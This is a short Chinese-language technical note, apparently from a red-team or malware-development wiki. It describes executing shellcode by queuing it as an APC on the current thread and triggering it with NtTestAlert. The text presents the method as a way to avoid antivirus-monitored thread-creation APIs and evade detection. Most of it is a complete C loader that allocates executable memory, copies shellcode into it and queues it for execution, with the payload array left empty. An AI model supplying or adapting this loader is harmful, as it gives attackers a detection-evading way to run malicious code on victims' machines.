---
description: APC & NtTestAlert代码执行
---

# APC & NtTestAlert Code Execute

## APC & NtTestAlert Code Execute简介

在Early Bird篇章介绍过,本质上是线程初始化时调用的为导出函数NtTestAlert函数清空APC队列导致的代码执行,那我们是不是可以直接调用这个函数进行代码执行呢？

这种技术并不依赖CreateThread和CreateRemoteThread等被杀软严格监控的API就能进行代码执行,也并没有直接操作恶意代码,而是触发操作系统去帮我们执行这些恶意代码,这样也一定程度上逃避了检测。

## 执行流程

1. 修改shellcode执行权限
2. 获取NtTestAlert函数地址
3. 插入APC队列
4. 调用NtTestAlert

## 代码实现

```text
#include <Windows.h>
#include<stdio.h>
char shellcode[]="";
typedef VOID(NTAPI* pNtTestAlert)(VOID);
int main() {

	pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");

	LPVOID lpBaseAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(lpBaseAddress, shellcode, sizeof(shellcode));

	QueueUserAPC((PAPCFUNC)lpBaseAddress, GetCurrentThread(), NULL);
	
	NtTestAlert();
	return 0;
}
```

## LINKS

{% embed url="https://undocumented.ntinternals.net/" %}



